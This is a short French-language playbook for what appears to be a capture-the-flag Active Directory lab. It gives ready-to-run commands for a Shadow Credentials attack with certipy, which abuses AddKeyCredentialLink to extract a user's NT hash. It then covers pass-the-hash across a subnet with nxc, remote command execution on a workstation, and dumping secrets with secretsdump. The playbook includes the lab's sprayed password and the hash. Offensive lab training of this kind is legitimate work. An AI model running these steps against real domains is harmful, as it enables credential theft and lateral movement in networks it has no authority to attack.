# Playbook 06 — Shadow Credentials

> Runbook étapes 59–64 | Challenge : *Je vis dans l'ombre, je suis ténébreux*

## Prérequis

- Compte **a.nozer** / `C3L3stin4!Us3r` (spray défaut)
- BloodHound : `AddKeyCredentialLink` de a.nozer sur **k.cheh**

---

### Étape 1 — Confirmer ACL dans JSON

```bash
grep -i -C 20 "k.cheh" *users*.json | grep -i AddKeyCredentialLink
```

---

### Étape 2 — Shadow Credentials (certipy)

```bash
certipy-ad shadow auto -u a.nozer@celestina.shop -p 'C3L3stin4!Us3r' -account k.cheh -target dc-celestina.celestina.shop
```

**Résultat attendu** :

```
[*] NT hash for 'k.cheh': 2b96340904f32f7888a232c79ea37610
```

**Journal** : technique + hash → flag *ombre*.

---

### Étape 3 — Pass-The-Hash k.cheh

```bash
nxc smb 10.13.37.0/24 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610'
```

**Résultat attendu (TP blanc)** : `(Pwn3d!)` sur **WK-044**.

---

### Étape 4 — ipconfig WK-044 (pivot)

```bash
nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -x 'ipconfig'
```

---

### Étape 5 — secretsdump en tant que k.cheh (optionnel)

```bash
secretsdump.py celestina.shop/k.cheh@10.13.37.44 -hashes :2b96340904f32f7888a232c79ea37610
```
